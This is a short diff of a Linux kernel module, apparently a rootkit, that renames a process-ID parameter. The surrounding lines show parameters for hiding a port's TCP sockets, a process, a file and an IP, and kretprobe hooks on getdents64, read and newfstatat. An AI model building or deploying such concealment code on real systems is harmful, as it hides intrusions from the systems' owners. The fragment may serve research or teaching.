@@ -23,9 +23,9 @@ static int port_to_hide = 8000;
 module_param(port_to_hide, int, S_IRWXU);
 MODULE_PARM_DESC(port_to_hide, "Hide all tcp sockets that is using this port.");
 
-static int pid_to_hide_n = 9704;
-module_param(pid_to_hide_n, int, S_IRWXU);
-MODULE_PARM_DESC(pid_to_hide_n, "Hide process with this PID.");
+static int pid_to_hide = 9704;
+module_param(pid_to_hide, int, S_IRWXU);
+MODULE_PARM_DESC(pid_to_hide, "Hide process with this PID.");
 
 static char* selected_ip_str = NULL;
 module_param(selected_ip_str, charp, S_IRWXU);
@@ -231,7 +231,7 @@ static int __init entrypoint(void)
         return -EINVAL;
     }
 
-    sprintf((char *) pid_to_hide_path, "/proc/%d", pid_to_hide_n);
+    sprintf((char *) pid_to_hide_path, "/proc/%d", pid_to_hide);
 
 
     if (register_kretprobe(&getdents64_kret_probe) < 0 || register_kretprobe(&read_kret_probe) < 0 || register_kretprobe(&newfstatat_kret_probe) < 0) {
@@ -246,7 +246,7 @@ static int __init entrypoint(void)
 
 
     pr_info("yarin_module registered; hide_file_name='%s', hide_port=%d, hide_pid=%d, block_ip=%s, filter_arp=%d\n",
-            hide_file_name, port_to_hide, pid_to_hide_n, selected_ip_str, filter_arp);
+            hide_file_name, port_to_hide, pid_to_hide, selected_ip_str, filter_arp);
     return 0;
 }
 
